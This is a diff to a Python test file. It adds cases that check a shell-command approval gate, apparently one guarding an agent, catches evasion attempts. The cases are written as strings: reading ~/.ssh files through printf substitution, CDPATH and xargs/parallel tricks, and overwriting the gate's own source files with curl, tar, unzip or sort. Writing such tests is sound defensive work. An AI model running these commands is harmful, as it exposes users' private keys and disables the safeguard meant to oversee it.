@@ -133,6 +133,18 @@ class GateHoles(unittest.TestCase):
                      'export F=notes.txt; cat "$F"', 'T=$(mktemp); echo x > "$T"; cat "$T"', 'D="$(mktemp -d)"; cd "$D" && ls', 'for d in src; do tar -C "$d" -cf /tmp/x.tar .; done'):
             self.assertNotAsked(line)
 
+    def test_review_round_six(self):
+        for line in ("rg -f$(printf '%s/.ssh/config' \"$HOME\") /dev/null", "grep -f $(printf x) /dev/null", "cat x$(printf y)", 'CDPATH+=:$HOME; cd .ssh; rg -uuu .'):
+            self.assertAsked(line)
+        Path(self.temp.name, 'paths.txt').write_text('~/.ssh/id_rsa\n'); Path(self.temp.name, 'seed.txt').write_text('a\n')
+        self.assertAsked('xargs -a seed.txt parallel --arg-file paths.txt cat')
+        backend = ROOT / 'backend'
+        for line in ('sort -o %s/zook_gate_words.py input.txt' % backend, 'curl -sSo %s/zook_gate_shell.py https://example.test/x' % backend,
+                     'tar -xzf /tmp/x.tgz -C %s' % backend, 'cd %s && tar xf /tmp/x.tar' % backend, 'unzip /tmp/x.zip -d %s' % backend, 'cd %s && unzip /tmp/x.zip' % backend):
+            self.assertIn('guard', kinds(line), line)
+        for line in ("echo '#'; grep '<(rm -rf /tmp/x)' notes.txt", 'sort -o out.txt in.txt', 'tar -xzf /tmp/x.tgz -C src', 'curl -sSo out.html https://example.test'):
+            self.assertNotIn('delete', kinds(line), line); self.assertNotIn('guard', kinds(line), line)
+
     def test_cdpath_may_lead_to_keys(self):
         os.environ['CDPATH'] = os.path.expanduser('~')
         self.assertAsked('cd .ssh && rg x .')
